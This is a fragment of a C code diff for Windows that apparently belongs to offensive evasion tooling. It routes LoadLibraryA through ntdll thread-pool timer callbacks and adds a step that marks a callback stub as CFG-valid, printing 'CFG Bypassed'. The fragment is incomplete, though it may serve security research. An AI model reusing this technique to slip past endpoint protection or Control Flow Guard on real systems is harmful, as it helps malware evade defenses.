@@ -1,5 +1,4 @@
-#include <windows.h>
-#include <stdio.h>
+#include "CFG.h"
 
 #define ALLOC_ON_CODE _Pragma("section(\".text\")") __declspec(allocate(".text"))
 
@@ -65,13 +64,20 @@ HMODULE proxiedLoadLibraryA(LPCSTR libName) {
     loadLibraryArgs.pLoadLibraryA = (UINT_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
     loadLibraryArgs.lpLibFileName = libName;
 
-    FARPROC pTpAllocPool                  = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocPool");
-    FARPROC pTpSetPoolMaxThreads          = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetPoolMaxThreads");
-    FARPROC pTpSetPoolMinThreads          = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetPoolMinThreads");
-    FARPROC pTpAllocCleanupGroup          = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocCleanupGroup");
-    FARPROC pTpAllocTimer                 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocTimer");
-    FARPROC pTpSetTimer                   = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetTimer");
+    FARPROC pTpAllocPool = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocPool");
+    FARPROC pTpSetPoolMaxThreads = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetPoolMaxThreads");
+    FARPROC pTpSetPoolMinThreads = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetPoolMinThreads");
+    FARPROC pTpAllocCleanupGroup = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocCleanupGroup");
+    FARPROC pTpAllocTimer = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocTimer");
+    FARPROC pTpSetTimer = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpSetTimer");
     FARPROC pTpReleaseCleanupGroupMembers = GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpReleaseCleanupGroupMembers");
+
+    if (!markCFGValid_nt((PVOID)CallbackStub))
+    {
+        puts("[!] Something went horribly wrong!");
+        return 0;
+    }
+    printf("[+] Success! CFG Bypassed\n");
 
     InitializeThreadpoolEnvironment(&CallBackEnviron);
 
